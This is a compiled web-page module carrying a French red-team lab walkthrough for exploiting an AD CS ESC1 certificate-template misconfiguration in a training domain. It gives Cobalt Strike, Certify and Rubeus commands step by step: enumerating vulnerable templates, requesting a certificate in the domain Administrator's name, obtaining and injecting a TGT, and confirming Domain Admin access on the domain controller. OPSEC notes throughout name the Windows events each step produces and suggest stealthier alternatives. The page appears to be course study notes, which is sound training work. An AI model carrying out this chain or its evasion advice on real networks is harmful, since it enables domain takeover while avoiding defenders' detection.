import{_ as t,o as s,c as a,an as n}from"./chunks/framework.BAJgIXXb.js";const o="/skill-issue/assets/adcs-esc1-command-hisotry.BimouWYJ.png",g=JSON.parse('{"title":"ESC1 - Templates Client Authentication mal configurés","description":"","frontmatter":{"pageClass":"crto-page","prev":false,"next":false},"headers":[],"relativePath":"crto/liham/labs/esc1.md","filePath":"crto/liham/labs/esc1.md"}'),i={name:"crto/liham/labs/esc1.md"};function r(l,e,c,d,u,p){return s(),a("div",null,e[0]||(e[0]=[n(`<h1 id="esc1-templates-client-authentication-mal-configures" tabindex="-1">ESC1 - Templates Client Authentication mal configurés <a class="header-anchor" href="#esc1-templates-client-authentication-mal-configures" aria-label="Permalink to &quot;ESC1 - Templates Client Authentication mal configurés&quot;">​</a></h1><blockquote><p>L’objectif de ce lab est d’identifier et d’exploiter une mauvaise configuration <strong>ESC1</strong>.</p></blockquote><hr><ol><li>Lancer Cobalt Strike et se connecter au team server.</li><li>Interagir avec le Beacon en <strong>medium integrity</strong>.</li><li>Énumérer la <strong>Certificate Authority (CA)</strong> et rechercher les templates vulnérables.</li></ol><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>spawnto x64 %windir%\\sysnative\\dllhost.exe</span></span>
<span class="line"><span>execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟠CAUTION</strong> - <code>execute-assembly</code> utilise <strong>fork &amp; run</strong> et lance un processus temporaire (par défaut <code>rundll32.exe</code>, sauf personnalisation de <code>spawnto</code>). L’<strong>Event 4688</strong> peut être généré si l’audit des créations de processus est actif. Configurer <code>spawnto</code> dans le Malleable C2 Profile (par exemple <code>dllhost.exe</code>).</p><p>L’énumération AD CS avec Certify envoie des requêtes LDAP au Domain Controller. L’<strong>Event 1644</strong> peut apparaître si l’audit LDAP détaillé est activé.</p><p><strong>Alternative plus discrète :</strong> utiliser <code>Certutil.exe -TCAInfo</code> pour une énumération CA de base (LOLBin), ou <code>ldapsearch</code> via BOF pour interroger directement <code>CN=Certificate Templates</code> sans nouveau processus :</p></blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ldapsearch (objectClass=pKICertificateTemplate) --dn &quot;CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=com&quot; --attributes name,msPKI-Certificate-Name-Flag,msPKI-RA-Signature,pKIExtendedKeyUsage,nTSecurityDescriptor</span></span></code></pre></div><blockquote><p>Indicateurs ESC1 dans les résultats : <code>msPKI-Certificate-Name-Flag: 1</code> (ENROLLEE_SUPPLIES_SUBJECT), <code>pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2</code> (Client Authentication), <code>msPKI-RA-Signature: 0</code> (sans approbation manuelle). Vérifier dans <code>nTSecurityDescriptor</code> que les droits d’enrollment incluent des groupes peu privilégiés (<code>Domain Users</code> / <code>Authenticated Users</code>).</p></blockquote><p>⚠️ Le résultat attendu est un template nommé <em>ESC1</em>.</p><ol start="4"><li>Demander un certificat avec le <em>UserPrincipalName</em> de l’Administrator du domaine dans le <strong>Subject Alternative Name (SAN)</strong>.</li></ol><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\Certify\\Certify\\bin\\Release\\Certify.exe request --ca &quot;lon-cs-1.contoso.com\\CONTOSO Root CA&quot; --template ESC1 --upn Administrator --quiet</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟠CAUTION</strong> - <code>execute-assembly</code> lance de nouveau un processus temporaire. La demande de certificat génère les <strong>Events 4886</strong> (réception) et <strong>4887</strong> (émission) sur la CA. Le certificat est renvoyé par le canal C2 et n’est pas écrit sur disque sauf action explicite.</p><p><strong>Alternative plus discrète :</strong> <a href="https://github.com/ly4k/Certipy" target="_blank" rel="noreferrer">Certipy</a>, depuis Linux, peut demander le certificat en RPC/HTTP si la CA est accessible. Dans ce lab, la méthode demandée reste <code>execute-assembly</code>.</p></blockquote><ol start="5"><li><p>Utiliser <strong>Rubeus</strong> pour demander un <strong>TGT</strong> au nom d’Administrator.</p><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap</span></span></code></pre></div></li></ol><blockquote><p><strong>OPSEC-🟠CAUTION</strong> - <code>execute-assembly</code> utilise un processus temporaire. La requête AS-REQ vers le KDC génère l’<strong>Event 4768</strong>. La pré-authentification par certificat (<strong>PKINIT</strong>) peut être identifiable dans les journaux. L’option <code>/enctype:aes256</code> est privilégiée à RC4 dans les notes.</p><p>L’option <code>/nowrap</code> renvoie le ticket en Base64. Le ticket n’est <strong>pas encore injecté</strong> ; l’injection intervient dans la suite du lab.</p><p><strong>Alternative :</strong> ajouter <code>/ptt</code> à la commande Rubeus pour injecter immédiatement le ticket, sans second appel <code>execute-assembly</code>. Un ticket injecté peut néanmoins être visible lors d’une analyse mémoire EDR.</p></blockquote><p>⚠️ Ce lab illustre l’exploitation d’<strong>ESC1</strong> pour obtenir des privilèges <strong>Domain Admin</strong>.</p><hr><h2 id="verifier-l-acces-domain-admin-avec-le-tgt-opsec-🟢safe" tabindex="-1">Vérifier l’accès Domain Admin avec le TGT (OPSEC-🟢SAFE) <a class="header-anchor" href="#verifier-l-acces-domain-admin-avec-le-tgt-opsec-🟢safe" aria-label="Permalink to &quot;Vérifier l’accès Domain Admin avec le TGT (OPSEC-🟢SAFE)&quot;">​</a></h2><p>Après l’obtention du TGT Administrator, vérifier l’accès Domain Admin sans générer de Lateral Movement inutile.</p><h3 id="etape-1-injecter-le-ticket-dans-la-session-beacon" tabindex="-1">Étape 1 - Injecter le ticket dans la session Beacon <a class="header-anchor" href="#etape-1-injecter-le-ticket-dans-la-session-beacon" aria-label="Permalink to &quot;Étape 1 - Injecter le ticket dans la session Beacon&quot;">​</a></h3><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe ptt /ticket:[BASE64_TICKET]</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟢SAFE</strong> - Le ticket est injecté en mémoire dans la session de logon du Beacon. En dehors du processus <code>execute-assembly</code>, aucun autre processus n’est créé. Pas d’écriture sur disque ni de trafic réseau au moment de l’injection.</p></blockquote><h3 id="etape-2-lister-le-partage-c-du-domain-controller" tabindex="-1">Étape 2 - Lister le partage C$ du Domain Controller <a class="header-anchor" href="#etape-2-lister-le-partage-c-du-domain-controller" aria-label="Permalink to &quot;Étape 2 - Lister le partage C$ du Domain Controller&quot;">​</a></h3><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ls \\\\lon-dc-1.contoso.com\\C$</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟢SAFE</strong> - La commande <code>ls</code> utilise le token/ticket actuel du Beacon via SMB et génère un <strong>logon réseau de type 3 (Event 4624)</strong> sur le DC. Aucun service ni processus distant n’est créé. L’accès au partage <code>C$</code> confirme les privilèges administrateur sur le DC.</p></blockquote><h3 id="alternative-verifier-le-ticket-et-la-session-sans-trafic-reseau" tabindex="-1">Alternative - Vérifier le ticket et la session sans trafic réseau <a class="header-anchor" href="#alternative-verifier-le-ticket-et-la-session-sans-trafic-reseau" aria-label="Permalink to &quot;Alternative - Vérifier le ticket et la session sans trafic réseau&quot;">​</a></h3><div class="language-Beacon-nocolor vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">Beacon-nocolor</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe klist</span></span></code></pre></div><blockquote><p><strong>OPSEC-🟢SAFE</strong> - Liste les tickets de la session de logon courante et permet de contrôler la présence du TGT Administrator avant utilisation, sans connexion à un hôte distant.</p></blockquote><img src="`+o+'">',28)]))}const b=t(i,[["render",r]]);export{g as __pageData,b as default};
